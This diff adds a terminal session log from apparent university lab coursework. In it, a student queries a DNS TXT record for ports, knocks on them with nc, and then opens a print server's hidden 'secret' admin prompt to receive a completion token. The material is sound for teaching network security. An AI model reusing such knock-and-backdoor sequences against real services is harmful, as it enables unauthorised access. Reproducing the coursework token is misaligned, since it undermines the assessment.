@@ -1,0 +1,18 @@
+Script started on 2026-04-30 16:27:33+00:00 [TERM="xterm" TTY="/dev/pts/0" COLUMNS="144" LINES="71"]
+[?2004h]0;in2011@lab000001: ~in2011@lab000001:~$ ca [Kt opu[K[Kutput.txt
+[?2004l[?2004h]0;in2011@lab000001: ~in2011@lab000001:~$ [7mPORTS=$(dig @10.200.51.18 google.com TXT +short | tr -d '"'); for p in $PORTS; do echo "" | nc -u -w1 10.200.51.18 $p; done;[27m[7m [27m[7mnc 10.200.51.18 8044[27m[APORTS=$(dig @10.200.51.18 google.com TXT +short | tr -d '"'); for p in $PORTS; do echo "" | nc -u -w1 10.200.51.18 $p; done; nc 10.200.51.18 8044
+[?2004lPrintTastic 10000 Print Server
+Commands
+status : report printer status
+test : print a test page
+exit : disconnect from print server
+secret : start a command prompt as admin
+
+secret
+Congratulations on completing IN2011 coursework 2!
+IN2011:2526:CW2-7-0ad8239f-19ddf37dafd-0a80045848e57165d0726cfde5ebbbc44f03ec984b6f9d28428d57791291ddc0-DONE
+ei xt it
+[?2004h]0;in2011@lab000001: ~in2011@lab000001:~$ exit
+[?2004lexit
+
+Script done on 2026-04-30 16:28:18+00:00 [COMMAND_EXIT_CODE="0"]
